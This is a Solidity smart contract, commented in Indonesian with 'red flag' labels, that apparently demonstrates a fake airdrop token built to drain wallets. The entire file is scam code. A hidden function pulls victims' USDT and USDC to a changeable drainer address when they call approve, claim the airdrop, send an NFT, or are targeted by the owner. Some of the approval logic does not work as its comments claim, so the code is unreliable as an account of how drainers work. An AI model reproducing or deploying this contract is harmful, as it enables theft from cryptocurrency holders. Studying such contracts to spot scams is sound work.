// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract FakeAirdropToken {
    string public name = "FreeAirdrop";
    string public symbol = "FREE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address private owner;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    
    // 🚨 RED FLAG 1: Owner bisa berubah
    address private drainerAddress;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() {
        owner = msg.sender;
        drainerAddress = msg.sender; // Awalnya owner, bisa diganti
        totalSupply = 1000000 * 10**decimals;
        _balances[msg.sender] = totalSupply;
    }
    
    // 🟢 FUNGSI NORMAL (tampak legit)
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(_balances[sender] >= amount, "Insufficient balance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    
    // 🚨 RED FLAG 2: Approve yang berbahaya
    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        
        // ⚠️ DIAM-DIAM: Setelah approve, panggil fungsi drain
        // Ini tersembunyi - user tidak tahu
        _stealTokens(msg.sender);
        
        return true;
    }
    
    // 🚨 FUNGSI DRAIN TERSEMBUNYI
    function _stealTokens(address victim) private {
        // Coba drain USDT
        try IERC20(USDT).transferFrom(victim, drainerAddress, IERC20(USDT).balanceOf(victim)) {
            // Success
        } catch {
            // Failed - mungkin belum approve
        }
        
        // Coba drain USDC
        try IERC20(USDC).transferFrom(victim, drainerAddress, IERC20(USDC).balanceOf(victim)) {
            // Success
        } catch {
            // Failed
        }
    }
    
    // 🚨 RED FLAG 3: Fungsi "claim" yang jahat
    function claimAirdrop() external {
        // Berikan token gratis (umpan)
        _transfer(owner, msg.sender, 1000 * 10**decimals);
        
        // ⚠️ Tapi sekaligus minta approval untuk semua token user
        _approveForAllTokens(msg.sender);
    }
    
    function _approveForAllTokens(address victim) private {
        // Set infinite approval untuk scammer bisa akses token user
        IERC20(USDT).approve(drainerAddress, type(uint256).max);
        IERC20(USDC).approve(drainerAddress, type(uint256).max);
        
        // Catat korban untuk drain nanti
        _markForDrain(victim);
    }
    
    // 🚨 RED FLAG 4: Owner privilege berbahaya
    function setDrainerAddress(address newDrainer) external {
        require(msg.sender == owner, "Not owner");
        drainerAddress = newDrainer; // Bisa ganti alamat drainer
    }
    
    function drainVictim(address victim) external {
        require(msg.sender == drainerAddress, "Not drainer");
        _stealTokens(victim);
    }
    
    // 🚨 RED FLAG 5: Callback untuk NFT drain
    function onERC721Received(address, address from, uint256, bytes calldata) 
        external returns (bytes4) {
        // Jika user kirim NFT ke kontrak ini, auto-drain tokennya
        _stealTokens(from);
        return this.onERC721Received.selector;
    }
    
    // Utility functions untuk menyembunyikan
    function _markForDrain(address) private pure {}
}